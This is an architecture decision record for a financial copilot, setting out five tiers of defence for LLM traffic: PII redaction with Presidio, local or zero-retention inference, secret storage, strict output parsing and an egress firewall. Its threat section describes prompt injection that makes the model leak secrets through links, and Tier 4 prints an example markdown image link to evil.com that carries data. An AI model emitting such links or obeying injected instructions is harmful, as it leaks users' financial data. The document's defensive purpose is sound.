# ADR-005: LLM Connection Security, Privacy & Data Exfiltration Defense

- **Status**: Accepted
- **Date**: 2026-10-14
- **Authors**: Security Guardian, Systems Architect, Lead Orchestrator
- **Scope**: Outbound LLM API traffic, local inference isolation, PII redaction, and exfiltration prevention.

---

## 1. Context & Threat Vectors

Connecting an autonomous financial copilot to an LLM introduces three critical vulnerabilities:
1. **PII & Data Leakage**: Sending raw customer names, invoices, or bank balances to commercial cloud LLMs, exposing the company to regulatory penalties (GDPR, CCPA) or data mining.
2. **Secret Hijacking**: Accidental exposure of API keys in client-side code, git commits, or memory dumps.
3. **Indirect Data Exfiltration**: Prompt injection forcing the LLM to encode sensitive secrets into markdown links or external webhook URLs.

---

## 2. Decision: 5-Tier LLM Connection Security Protocol

```
[ User Input / Bank Data ]
            │
            ▼
┌────────────────────────────────────────────────────────┐
│ TIER 1: Presidio PII Masking (Client/Host Side)        │ -> Names, IBANs, Tax IDs replaced with tokens
└──────────────────────────┬─────────────────────────────┘
                           ▼
┌────────────────────────────────────────────────────────┐
│ TIER 2: Network Isolation & Provider Gateway           │
│   • Mode A: Local Ollama (127.0.0.1 Air-Gapped)        │ -> Zero outbound internet packets
│   • Mode B: Enterprise TLS 1.3 + Zero Data Retention   │ -> Commercial API does not train on data
└──────────────────────────┬─────────────────────────────┘
                           ▼
┌────────────────────────────────────────────────────────┐
│ TIER 3: Secret Shielding                               │ -> Keys stored in environment / keyrings only
└──────────────────────────┬─────────────────────────────┘
                           ▼
┌────────────────────────────────────────────────────────┐
│ TIER 4: Strict Output Parsing (Instructor / Pydantic) │ -> Drops arbitrary markdown links or HTML tags
└──────────────────────────┬─────────────────────────────┘
                           ▼
┌────────────────────────────────────────────────────────┐
│ TIER 5: Network Egress Firewall                        │ -> Drops traffic to unauthorized IPs
└────────────────────────────────────────────────────────┘
```

---

## 3. Defensive Implementations

### Tier 1: Zero Raw PII to External APIs (Presidio Redaction)
Before prompt assembly, all text passes through Microsoft Presidio:
```python
# services/security/pii_scrubber.py
from presidio_analyzer import AnalyzerEngine
from presidio_anonymizer import AnonymizerEngine

analyzer = AnalyzerEngine()
anonymizer = AnonymizerEngine()

def redact_sensitive_pii(text: str) -> str:
    results = analyzer.analyze(text=text, entities=["PHONE_NUMBER", "EMAIL_ADDRESS", "IBAN_CODE", "US_SSN"], language="en")
    anonymized = anonymizer.anonymize(text=text, analyzer_results=results)
    return anonymized.text
```
*Result*: Real bank account numbers and personal identities never leave the host machine.

### Tier 2: Air-Gapped Local Inference (Ollama) vs. Enterprise Zero Retention
- **Local Mode**: If `LLM_MODEL=ollama/llama3.1:8b`, the application communicates with `http://127.0.0.1:11434`. All packets remain within the local loopback interface. No network cables or internet access required.
- **Cloud Mode**: If commercial APIs are used (Gemini, OpenAI), requests use TLS 1.3 with Enterprise Zero-Data Retention flags (`store=False`), guaranteeing prompts are not cached or used for model training.

### Tier 3: Secret Shielding
- API keys live exclusively in server-side environment variables (`.env`), never embedded in source code or sent to client browsers.
- In production, keys are injected via Docker secrets or AWS Secrets Manager / Azure Key Vault.

### Tier 4 & 5: Prompt Exfiltration Defense
- **Markdown Image Link Scrubbing**: If prompt injection attempts to leak data via `![leak](https://evil.com?data=...)`, Instructor enforces strict JSON parsing, stripping all arbitrary HTML and markdown syntax.
- **Egress Firewall**: The application container network policy restricts outbound connections exclusively to authorized bank endpoints and the official LLM provider domain; any connection to an unknown IP is dropped.
